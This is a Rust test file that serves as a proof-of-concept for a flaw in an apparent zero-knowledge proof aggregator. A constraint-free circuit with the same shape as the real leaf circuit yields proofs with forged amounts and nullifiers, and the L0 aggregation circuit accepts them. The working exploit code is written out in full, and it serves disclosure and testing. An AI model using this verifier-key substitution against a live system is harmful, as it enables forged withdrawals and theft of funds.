//! Security vulnerability proof-of-concept.
//!
//! This test demonstrates that the L0 aggregation circuit accepts proofs from
//! ANY circuit with matching CommonCircuitData shape, not just the intended
//! leaf circuit. This is because the inner verifier key is an unconstrained witness.
//!
//! Run with:
//! ```bash
//! cargo test -p qp-wormhole-aggregator --release test_verifier_key_substitution -- --nocapture
//! ```

#[cfg(test)]
mod tests {
    use plonky2::{
        field::types::Field,
        iop::witness::{PartialWitness, WitnessWrite},
        plonk::{
            circuit_builder::CircuitBuilder,
            circuit_data::{CircuitConfig, CircuitData},
        },
    };

    use zk_circuits_common::circuit::{C, D, F};

    use crate::layer0::circuit::{
        circuit_logic::Layer0AggregationCircuit, constants::LEAF_PI_LEN,
    };

    /// Build a "legitimate" leaf circuit that has real constraints.
    fn build_legitimate_leaf_circuit() -> (CircuitData<F, C, D>, Vec<plonky2::iop::target::Target>)
    {
        let config = CircuitConfig::standard_recursion_config();
        let mut builder = CircuitBuilder::<F, D>::new(config);

        let pis: Vec<_> = (0..LEAF_PI_LEN)
            .map(|_| builder.add_virtual_target())
            .collect();

        // REAL constraints that enforce security properties
        builder.range_check(pis[1], 32); // output_amount_1
        builder.range_check(pis[2], 32); // output_amount_2
        builder.range_check(pis[3], 16); // volume_fee_bps

        let targets = pis.clone();
        builder.register_public_inputs(&pis);
        (builder.build::<C>(), targets)
    }

    /// Build a MALICIOUS circuit - same PI count, but NO security constraints.
    /// Key insight: we use the SAME config, so FRI params will be compatible.
    fn build_malicious_leaf_circuit() -> (CircuitData<F, C, D>, Vec<plonky2::iop::target::Target>)
    {
        let config = CircuitConfig::standard_recursion_config();
        let mut builder = CircuitBuilder::<F, D>::new(config);

        let pis: Vec<_> = (0..LEAF_PI_LEN)
            .map(|_| builder.add_virtual_target())
            .collect();

        // NO constraints! Attacker can set any values.
        // This is the attack: bypass all security checks.

        let targets = pis.clone();
        builder.register_public_inputs(&pis);
        (builder.build::<C>(), targets)
    }

    #[test]
    fn test_verifier_key_substitution_vulnerability() {
        println!("\n");
        println!("╔══════════════════════════════════════════════════════════════════╗");
        println!("║  SECURITY VULNERABILITY PROOF-OF-CONCEPT                        ║");
        println!("║  Demonstrating unconstrained verifier key in recursive proofs   ║");
        println!("╚══════════════════════════════════════════════════════════════════╝\n");

        // Step 1: Build the "legitimate" leaf circuit
        println!("Step 1: Building legitimate leaf circuit...");
        let (legit_circuit, legit_targets) = build_legitimate_leaf_circuit();
        println!(
            "  Degree bits: {}, PIs: {}, cap_height: {}",
            legit_circuit.common.degree_bits(),
            legit_circuit.common.num_public_inputs,
            legit_circuit.common.fri_params.config.cap_height
        );

        // Step 2: Build a MALICIOUS circuit
        println!("\nStep 2: Building MALICIOUS circuit (no constraints)...");
        let (malicious_circuit, malicious_targets) = build_malicious_leaf_circuit();
        println!(
            "  Degree bits: {}, PIs: {}, cap_height: {}",
            malicious_circuit.common.degree_bits(),
            malicious_circuit.common.num_public_inputs,
            malicious_circuit.common.fri_params.config.cap_height
        );

        // The circuits have the same structure
        assert_eq!(
            legit_circuit.common.num_public_inputs,
            malicious_circuit.common.num_public_inputs,
        );
        println!("  ✓ Same number of public inputs");

        // Step 3: Build L0 using the MALICIOUS circuit's common data
        // (In real attack, attacker builds their own L0 that accepts their malicious proofs)
        println!("\nStep 3: Building L0 aggregation circuit using MALICIOUS circuit's shape...");
        let l0_config = CircuitConfig::standard_recursion_config();
        let l0_circuit = Layer0AggregationCircuit::new(
            l0_config,
            malicious_circuit.common.clone(), // Using malicious circuit's common data!
            1,
        );
        let l0_targets = l0_circuit.targets();
        let l0_data = l0_circuit.build_circuit();
        println!("  ✓ L0 circuit built");

        // Step 4: Generate a malicious proof with FAKE values
        println!("\nStep 4: Generating MALICIOUS proof with FAKE values...");
        let fake_public_inputs: [u64; LEAF_PI_LEN] = [
            999,                                          // asset_id
            0xFFFFFFFF,                                   // output_amount_1 - HUGE!
            0xFFFFFFFF,                                   // output_amount_2 - HUGE!
            9999,                                         // volume_fee_bps - way over 100%
            0xDEADBEEF, 0xCAFEBABE, 0x12345678, 0x87654321, // fake nullifier
            0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD, // fake exit_1
            0xEEEEEEEE, 0xFFFFFFFF, 0x11111111, 0x22222222, // fake exit_2
            0x33333333, 0x44444444, 0x55555555, 0x66666666, // fake block_hash
            9999999,                                      // fake block_number
        ];

        let mut pw = PartialWitness::new();
        for (i, &val) in fake_public_inputs.iter().enumerate() {
            pw.set_target(malicious_targets[i], F::from_canonical_u64(val))
                .unwrap();
        }

        let malicious_proof = malicious_circuit.prove(pw).expect("prove malicious");
        println!("  ✓ Generated proof with FAKE values:");
        println!("    output_amount_1 = {} (would fail range_check in legit circuit!)", fake_public_inputs[1]);
        println!("    volume_fee_bps = {} (over 100%!)", fake_public_inputs[3]);

        // Step 5: THE ATTACK - use malicious proof in L0
        println!("\nStep 5: THE ATTACK - feeding malicious proof to L0...");
        let mut pw = PartialWitness::new();

        // Provide the MALICIOUS verifier key
        pw.set_verifier_data_target(
            &l0_targets.leaf_verifier_data,
            &malicious_circuit.verifier_only,
        )
        .unwrap();

        pw.set_proof_with_pis_target(&l0_targets.leaf_proofs[0], &malicious_proof)
            .unwrap();

        for pre_image in &l0_targets.dummy_nullifier_pre_images {
            for (i, &t) in pre_image.iter().enumerate() {
                pw.set_target(t, F::from_canonical_u64(i as u64)).unwrap();
            }
        }

        // Step 6: Generate L0 proof
        println!("\nStep 6: Generating L0 proof...");
        let l0_proof = l0_data.prove(pw).expect("L0 prove");
        println!("  ✓ L0 proof generated!");

        // Step 7: Verify L0 proof
        println!("\nStep 7: Verifying L0 proof...");
        l0_data.verify(l0_proof.clone()).expect("L0 verify");
        println!("  ✓ L0 proof VERIFIES!");

        println!("\n╔══════════════════════════════════════════════════════════════════╗");
        println!("║  VULNERABILITY CONFIRMED!                                        ║");
        println!("║                                                                  ║");
        println!("║  The attacker successfully:                                      ║");
        println!("║  1. Created a malicious circuit with NO security constraints     ║");
        println!("║  2. Generated a proof with invalid values (failed range checks) ║");
        println!("║  3. Got it accepted by L0 aggregation                           ║");
        println!("║  4. Produced a VALID L0 proof that verifies!                    ║");
        println!("║                                                                  ║");
        println!("║  ROOT CAUSE: The leaf verifier key is an unconstrained witness  ║");
        println!("╚══════════════════════════════════════════════════════════════════╝\n");

        // This test should FAIL to alert us to the vulnerability
        panic!("VULNERABILITY DEMONSTRATED: L0 accepted proof from malicious circuit!");
    }
}
